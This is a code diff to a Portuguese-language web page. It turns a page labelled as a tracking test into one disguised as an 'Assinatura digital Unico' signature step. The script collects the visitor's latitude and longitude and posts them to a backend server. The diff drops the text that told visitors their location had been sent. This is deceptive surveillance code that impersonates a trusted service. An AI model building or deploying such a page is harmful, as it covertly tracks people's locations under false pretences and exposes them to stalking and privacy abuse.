@@ -2,7 +2,7 @@
 <html>
 <head>
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>Teste de Localização</title>
+    <title>Assinatura digital Unico</title>
     <style>
         body { font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; background-color: #f0f2f5; }
         .container { background-color: white; padding: 2rem; border-radius: 8px; box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1); text-align: center; }
@@ -15,13 +15,12 @@
 </head>
 <body>
     <div class="container">
-        <h1>Teste de Rastreamento</h1>
+        <h1>Assinatura digital Unico</h1>
         <div id="status">Buscando sua localização...</div>
-        <button id="prosseguirBtn">Prosseguir</button>
+        <button id="prosseguirBtn">Prosseguir para Assinatura</button>
     </div>
 
     <script>
-        // SUBSTITUA ESTA URL PELA URL DO SEU SERVIDOR NO RENDER
         const BACKEND_API_URL = 'https://sua-url-do-render.onrender.com';
 
         const statusDiv = document.getElementById('status');
@@ -33,14 +32,10 @@
             fetch(`${BACKEND_API_URL}/api/location`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ latitude, longitude, prosseguiu })
+                body: JSON.stringify({ latitude, longitude, prosseguir })
             })
             .then(response => {
-                if (response.ok) {
-                    if (prosseguir) {
-                        statusDiv.textContent = 'Localização enviada. Prosseguindo...';
-                    }
-                } else {
+                if (!response.ok) {
                     statusDiv.textContent = 'Erro ao enviar localização.';
                 }
             })
@@ -56,7 +51,7 @@
                     latitude = position.coords.latitude;
                     longitude = position.coords.longitude;
                     
-                    statusDiv.textContent = 'Localização obtida com sucesso!';
+                    statusDiv.textContent = 'Localização obtida com sucesso! Prossiga para assinatura.';
                     prosseguirBtn.style.display = 'block';
                     
                     enviarDados(false);
